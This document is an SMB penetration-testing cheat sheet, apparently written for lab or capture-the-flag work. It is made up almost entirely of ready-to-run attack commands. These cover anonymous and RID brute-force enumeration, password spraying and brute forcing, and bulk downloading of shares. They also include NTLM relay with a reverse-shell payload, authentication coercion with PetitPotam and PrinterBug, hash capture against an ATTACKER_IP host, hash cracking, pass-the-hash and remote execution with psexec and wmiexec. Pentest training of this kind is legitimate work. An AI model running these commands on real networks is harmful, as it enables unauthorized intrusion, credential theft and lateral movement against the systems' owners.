
## Protocol Overview

**SMB (Server Message Block)** is a network file sharing protocol that allows applications to read and write files on remote servers. It's fundamental to Windows networking and commonly found in Active Directory environments.

**Key Ports:**
- **445/TCP** - SMB over TCP (modern)
- **139/TCP** - SMB over NetBIOS
- **135/TCP** - RPC Endpoint Mapper

**Common Uses:**
- File and printer sharing
- Inter-process communication (IPC)
- Network browsing
- Remote administration

---
## Exploitation Workflow Summary
```
1. Discovery
   ├─ Nmap scan (ports 139,445)
   └─ Identify SMB version

2. Anonymous Enumeration
   ├─ Test null session
   ├─ Test guest access
   ├─ List shares
   ├─ RPC enumeration
   └─ RID brute force

3. Credential Attacks
   ├─ Password spraying
   ├─ Brute forcing
   └─ Hash capture

4. Authenticated Access
   ├─ Enumerate shares
   ├─ Download sensitive files
   ├─ Check logged-on users
   └─ Identify admin access

5. Exploitation
   ├─ NTLM relay
   ├─ PSExec/WMIExec
   └─ Lateral movement
```


---

## Initial Reconnaissance

### Nmap Enumeration

**Basic scan:**
```bash
nmap -sV -sC -p139,445 10.10.10.10
```

**OS detection:**
```bash
nmap --script smb-os-discovery.nse -p445 10.10.10.10
```

**Vulnerability scanning:**
```bash
nmap --script 'smb-vuln*' -Pn -p139,445 10.10.10.10
```

**Aggressive scan:**
```bash
nmap -A -p445 10.10.10.10
```

### Important Version Notes

**SMBv1** - Deprecated, vulnerable (MS17-010/EternalBlue)
**SMBv2/SMBv3** - Modern, more secure
**SMBv3.1.1** - Windows 10 1903/1909 (vulnerable to SMBGhost CVE-2020-0796)

---

## Authentication Concepts

### Guest vs Null Session

**Null Session:**
- Anonymous connection (no username/password)
- Uses empty credentials: `username=""` `password=""`
- Often allows basic enumeration

**Guest Session:**
- Uses "guest" account
- May have slightly more permissions than null
- Syntax: `username="guest"` `password=""`

**Testing both:**
```bash
# Null session
smbclient -N -L //10.10.10.10

# Guest session
nxc smb 10.10.10.10 -u 'guest' -p ''
```

---

## Anonymous Enumeration

### List Shares

**Using smbclient:**
```bash
# List shares anonymously
smbclient -N -L \\\\10.10.10.10
```

**Using smbmap:**
```bash
# Basic share listing
smbmap -H 10.10.10.10

# Browse directory recursively
smbmap -H 10.10.10.10 -r ShareName
```

**Using NetExec/CrackMapExec:**
```bash
# Anonymous share listing
nxc smb 10.10.10.10 --shares -u '' -p ''
```

### Connect to Shares

**Anonymous connection:**
```bash
smbclient //10.10.10.10/ShareName

# If prompted for password, just press Enter
```

**Guest connection:**
```bash
smbclient //10.10.10.10/ShareName -U guest
```

### Download Files

**Single file:**
```bash
smb: \> get filename.txt
```

**Multiple files with pattern:**
```bash
smb: \path\to\files\> mask ""
smb: \path\to\files\> recurse ON
smb: \path\to\files\> mget *
```

**Recursive download (from shell):**
```bash
smbget -rR smb://10.10.10.10/ShareName/path/ -U guest
```

### Upload Files
```bash
smb: \> put localfile.txt remotefile.txt
```

---

## RPC Enumeration

### RPCClient Basics

**Anonymous connection:**
```bash
rpcclient -U "" 10.10.10.10
# Press Enter when prompted for password
```

**With credentials:**
```bash
rpcclient -U "username%password" 10.10.10.10
```

### Essential RPC Commands

| Command | Purpose |
|---------|---------|
| `srvinfo` | Server information |
| `enumdomains` | List domains |
| `querydominfo` | Domain details |
| `netshareenumall` | List all shares |
| `netsharegetinfo <share>` | Share details |
| `enumdomusers` | List domain users |
| `enumdomgroups` | List domain groups |
| `queryuser <RID>` | User details |
| `querygroup <RID>` | Group details |

### Practical RPC Workflow
```bash
# Connect
rpcclient -U "" 10.10.10.10

# Get server info
rpcclient $> srvinfo

# List domains
rpcclient $> enumdomains

# Get domain info
rpcclient $> querydominfo

# List shares
rpcclient $> netshareenumall

# List users
rpcclient $> enumdomusers

# Get user details (replace 0x1f4 with RID from enumdomusers)
rpcclient $> queryuser 0x1f4
```

---

## RID Brute Forcing

**What is a RID?**
RID (Relative Identifier) is the last part of a Windows SID. Each user/group has a unique RID. By brute-forcing RIDs, we can discover hidden accounts.

### Manual Bash Script
```bash
for i in $(seq 500 1100); do
    rpcclient -N -U "" 10.10.10.10 \
    -c "queryuser 0x$(printf '%x\n' $i)" \
    | grep "User Name\|user_rid\|group_rid" && echo ""
done
```

### Using Impacket
```bash
samrdump.py 10.10.10.10
```

### Using NetExec
```bash
# Anonymous RID brute force
nxc smb 10.10.10.10 -u 'guest' -p '' --rid-brute

# Authenticated RID brute force
nxc smb 10.10.10.10 -u username -p password --rid-brute
```

---

## Authenticated Enumeration

### List Shares (Authenticated)

**NetExec:**
```bash
nxc smb 10.10.10.10 -u username -p password --shares
```

**smbmap:**
```bash
smbmap -u username -p password -H 10.10.10.10
```

### Connect to Shares
```bash
smbclient -U username //10.10.10.10/ShareName
```

### Spider Shares (Download Everything)
```bash
# NetExec spider module
nxc smb 10.10.10.10 -u username -p password \
  -M spider_plus -o DOWNLOAD_FLAG=True
```

---

## Enum4Linux Automation

**Anonymous scan:**
```bash
enum4linux-ng 10.10.10.10 -A
```

**Authenticated scan:**
```bash
enum4linux-ng -A -u "DOMAIN/username" -p "password" 10.10.10.10
```

**What it does:**
- Enumerates users, groups, shares
- Checks password policies
- Identifies domain controllers
- Tests for null sessions
- Gathers OS information

---

## Credential Attacks

### Password Spraying

**Concept**: Try one password against many users (avoids account lockout).

**Using NetExec:**
```bash
# Single password, multiple users
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Username = Password attack
nxc smb 10.10.10.10 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Check lockout status:**
```bash
nxc smb 10.10.10.10 -u username -p password --users
```

**Look for `badPasswordCount` in output to monitor lockout risk.**

### Brute Force Attacks

**Hydra:**
```bash
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

**Metasploit:**
```bash
use auxiliary/scanner/smb/smb_login
set rhosts 10.10.10.10
set user_file users.txt
set pass_file passwords.txt
set stop_on_success true
run
```

**Nmap:**
```bash
# Prepare credential file (format: user/pass per line)
sed -i 's/:/\//g' creds.txt

nmap -p445 --script smb-brute \
  --script-args brute.credfile=creds.txt 10.10.10.10
```

---

## Windows Usage

### Command Prompt

**List directory:**
```cmd
dir \\10.10.10.10\ShareName\
```

**Mount share:**
```cmd
net use Z: \\10.10.10.10\ShareName
```

**With credentials:**
```cmd
net use Z: \\10.10.10.10\ShareName /user:DOMAIN\username password
```

**Disconnect:**
```cmd
net use Z: /delete
```

### PowerShell

**List directory:**
```powershell
Get-ChildItem \\10.10.10.10\ShareName\
```

**Mount share:**
```powershell
New-PSDrive -Name "Z" -Root "\\10.10.10.10\ShareName" -PSProvider "FileSystem"
```

**With credentials:**
```powershell
$username = 'DOMAIN\user'
$password = 'Password123!'
$secpass = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpass
New-PSDrive -Name "Z" -Root "\\10.10.10.10\ShareName" -PSProvider "FileSystem" -Credential $cred
```

---

## Linux Usage

### Manual Mount

**Install requirements:**
```bash
sudo apt install cifs-utils
```

**Mount share:**
```bash
sudo mkdir /mnt/share
sudo mount -t cifs //10.10.10.10/ShareName /mnt/share \
  -o username=user,password=pass,domain=DOMAIN
```

**Using credentials file:**
```bash
# Create /tmp/creds.txt
username=user
password=Password123!
domain=DOMAIN

# Mount
sudo mount -t cifs //10.10.10.10/ShareName /mnt/share \
  -o credentials=/tmp/creds.txt
```

**Unmount:**
```bash
sudo umount /mnt/share
```

---

## NTLM Relay Attacks

### What is NTLM Relay?

**Concept**: Intercept NTLM authentication attempts and relay them to other systems to gain unauthorized access.

**Requirements:**
- SMB signing disabled on target
- Valid authentication attempt to intercept
- Target system different from source

### Check for SMB Signing
```bash
# Find targets without signing
nxc smb targets.txt --gen-relay-list nosigning.txt
```

### Setup Responder

**Edit config** (`/etc/responder/Responder.conf`):
```ini
SMB = Off  # Disable SMB server
HTTP = Off  # Disable HTTP server (optional)
```

**Start Responder:**
```bash
sudo responder -I eth0 -dw
```

### Execute Relay

**Basic relay (dumps SAM):**
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

**Relay with command execution:**
```bash
# Create reverse shell payload first
# Then relay with -c option
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "powershell -enc BASE64_PAYLOAD"
```

**Relay to specific target:**
```bash
ntlmrelayx.py --no-http-server -smb2support -t 10.10.10.20
```

### Force Authentication

**Techniques to trigger authentication:**

1. **Coercer** (automatic):
```bash
coercer -t 10.10.10.20 -l 10.10.14.5
```

2. **PetitPotam**:
```bash
python3 PetitPotam.py 10.10.14.5 10.10.10.20
```

3. **PrinterBug/SpoolSample**:
```bash
python3 printerbug.py DOMAIN/user:password@10.10.10.20 10.10.14.5
```

4. **Social engineering** (e.g., send malicious link)

---

## Remote Code Execution

### PSExec

**What it does**: Executes commands remotely via SMB by creating a service.

**Using Impacket:**
```bash
psexec.py DOMAIN/username:password@10.10.10.10
```

**With NTLM hash:**
```bash
psexec.py -hashes :NTLM_HASH DOMAIN/username@10.10.10.10
```

**Execute single command:**
```bash
psexec.py DOMAIN/username:password@10.10.10.10 "whoami"
```

### WMIExec

**Stealthier alternative** (no service creation):
```bash
wmiexec.py DOMAIN/username:password@10.10.10.10
```

### SMBExec

**Uses scheduled tasks** instead of services:
```bash
smbexec.py DOMAIN/username:password@10.10.10.10
```

---

## Logged-On User Enumeration

### Identify Active Sessions
```bash
nxc smb 10.10.10.0/24 -u username -p password --loggedon-users
```

**Why this matters:**
- Identify high-value targets (admins logged in)
- Credential theft opportunities
- Lateral movement planning

### Impersonate Logged-On Users
```bash
nxc smb 10.10.10.10 -u localAdmin -p password \
  -M schtask_as -o USER=targetuser CMD="cmd /c command"
```

---

## Password Change Scenarios

### STATUS_PASSWORD_MUST_CHANGE

**Error indicates**: Password expired or must be reset on first login.

**Change password:**
```bash
smbpasswd.py -newpass 'NewPassword123!' \
  DOMAIN/username:'OldPassword'@10.10.10.10
```

---

## Hash Capture

### Force Authentication to Capture NetNTLMv2

**Start Responder:**
```bash
sudo responder -I eth0
```

**Trigger authentication:**
```bash
# Via SMB client from target
smbclient //ATTACKER_IP/share
```

**Crack captured hash:**
```bash
hashcat -m 5600 captured_hash.txt wordlist.txt
```

---

## NetExec (CrackMapExec) Quick Reference

**Basic authentication test:**
```bash
nxc smb 10.10.10.10 -u username -p password
```

**Check multiple hosts:**
```bash
nxc smb 10.10.10.0/24 -u username -p password
```

**Pass-the-Hash:**
```bash
nxc smb 10.10.10.10 -u username -H NTLM_HASH
```

**Local authentication:**
```bash
nxc smb 10.10.10.10 -u username -p password --local-auth
```

**Execute commands:**
```bash
nxc smb 10.10.10.10 -u username -p password -x "whoami"
```

**Kerberos authentication:**
```bash
nxc smb target.domain.local -u username -p password -k -d domain.local
```

---

## Troubleshooting

### STATUS_NOT_SUPPORTED Error

**Problem**: IP-based connection rejected, but hostname works.

**Solution**: Use Kerberos authentication with FQDN:
```bash
# Add to /etc/hosts
echo "10.10.10.10 dc.domain.local domain.local" >> /etc/hosts

# Use -k flag with FQDN
nxc smb dc.domain.local -u username -p password -k -d domain.local
```

### Access Denied Despite Valid Creds

**Common causes:**
1. User not in required groups
2. SMB signing mismatch
3. Firewall blocking
4. Share permissions too restrictive

**Debugging:**
```bash
# Check user groups
nxc smb 10.10.10.10 -u username -p password --groups

# Check share permissions
smbmap -u username -p password -H 10.10.10.10
```

